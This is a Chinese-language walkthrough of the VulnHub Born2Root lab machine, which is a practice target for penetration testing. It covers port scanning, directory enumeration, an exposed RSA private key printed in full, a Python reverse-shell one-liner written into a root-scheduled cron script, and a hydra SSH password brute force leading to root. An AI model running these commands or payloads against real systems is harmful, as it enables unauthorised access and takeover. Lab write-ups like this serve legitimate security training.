# Born2Root：1

> https://download.vulnhub.com/born2root/born2root.ova

靶场IP：`192.168.32.17`

扫描对外端口服务

```
┌──(root㉿kali)-[~]
└─# nmap -sV -p1-65535 192.168.32.17
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 23:04 EDT
Nmap scan report for 192.168.32.17
Host is up (0.00018s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
49713/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:30:22:B0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds

```

访问80端口

![image-20220913110520866](../../.gitbook/assets/image-20220913110520866.png)

爆破目录

```
┌──(root㉿kali)-[~]
└─# dirb http://192.168.32.17/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 12 23:05:35 2022
URL_BASE: http://192.168.32.17/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.32.17/ ----
==> DIRECTORY: http://192.168.32.17/files/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.32.17/icons/                                                                                                                                                                                                
+ http://192.168.32.17/index.html (CODE:200|SIZE:5651)                                                                                                                                                                                    
==> DIRECTORY: http://192.168.32.17/manual/                                                                                                                                                                                               
+ http://192.168.32.17/robots.txt (CODE:200|SIZE:57)                                                                                                                                                                                      
+ http://192.168.32.17/server-status (CODE:403|SIZE:301)                                                                                                                                                                                  
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.17/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.17/icons/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.17/manual/ ----
==> DIRECTORY: http://192.168.32.17/manual/da/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/de/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/en/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/es/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/fr/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/images/                                                                                                                                                                                        
+ http://192.168.32.17/manual/index.html (CODE:200|SIZE:626)                                                                                                                                                                              
==> DIRECTORY: http://192.168.32.17/manual/ja/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/ko/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/style/                                                                                                                                                                                         
==> DIRECTORY: http://192.168.32.17/manual/tr/                                                                                                                                                                                            
==> DIRECTORY: http://192.168.32.17/manual/zh-cn/                                                                                                                                                                                         
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.17/manual/da/ ----
==> DIRECTORY: http://192.168.32.17/manual/da/developer/                                                                                                                                                                                  
==> DIRECTORY: http://192.168.32.17/manual/da/faq/                                                                                                                                                                                        
==> DIRECTORY: http://192.168.32.17/manual/da/howto/                                                                                                                                                                                      
+ http://192.168.32.17/manual/da/index.html (CODE:200|SIZE:9041)                                                                                                                                                                          
==> DIRECTORY: http://192.168.32.17/manual/da/misc/                                                                                                                                                                                       
==> DIRECTORY: http://192.168.32.17/manual/da/mod/      
```

访问：`/robots.txt`

![image-20220913110707452](../../.gitbook/assets/image-20220913110707452.png)

访问：`/wordpress-blog`

![image-20220913110830838](../../.gitbook/assets/image-20220913110830838.png)

访问：`/files`

![image-20220913110849893](../../.gitbook/assets/image-20220913110849893.png)

访问：`/icons/ `

![image-20220913111210353](../../.gitbook/assets/image-20220913111210353.png)

找到：`VDSoyuAXiO.txt`，发现是一个私钥文件

```
┌──(root㉿kali)-[/tmp]
└─# curl http://192.168.32.17/icons/VDSoyuAXiO.txt

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
-----END RSA PRIVATE KEY-----

```

根据首页发现几个用户名

```
Martin N
Hadi M
Jimmy S 
martin@secretsec.com
```

使用`martin`进行ssh登录

> ssh报错
>
> ![image-20220913112154829](../../.gitbook/assets/image-20220913112154829.png)
>
> **解决方法：**
>
> - **保证id_rsa权限为600**
> - **cd ~/.ssh目录下**
> - **创建文件config**
> - **文件内容: PubkeyAcceptedKeyTypes +ssh-rsa，保存退出**

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa martin@192.168.32.17

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42

READY TO ACCESS THE SECRET LAB ? 

secret password : 
WELCOME ! 

```

查看计划任务，发现`sekurity.py`

```
martin@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5   * * * *   jimmy   python /tmp/sekurity.py

```

设置反弹shell

```
martin@debian:/tmp$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.5",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >/tmp/sekurity.py
```

由于 cron 作业设置为每五分钟执行一次脚本，因此需要一些时间。

![image-20220913113133749](../../.gitbook/assets/image-20220913113133749.png)

我们找不到任何可以帮助我们根机器的东西。现在我们使用第三个用户来root机器。我们知道第三个用户是 hadi。所以我们使用这个名字创建一个字典。

我们使用 `bopscrk`创建字典。

![image-20220913120042179](../../.gitbook/assets/image-20220913120042179.png)

使用SSH进行爆破

```
┌──(root㉿kali)-[/opt/bopscrk]
└─# hydra -l hadi -P tmp.txt ssh://192.168.32.17 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-13 00:01:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 23 login tries (l:1/p:23), ~2 tries per task
[DATA] attacking ssh://192.168.32.17:22/
[22][ssh] host: 192.168.32.17   login: hadi   password: hadi123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-13 00:01:11

```

ssh登录

```
┌──(root㉿kali)-[/opt/bopscrk]
└─# ssh hadi@192.168.32.17            
hadi@192.168.32.17's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  7 20:53:17 2017

```

切换到root用户

![image-20230208133855269](../../.gitbook/assets/image-20230208133855269.png)
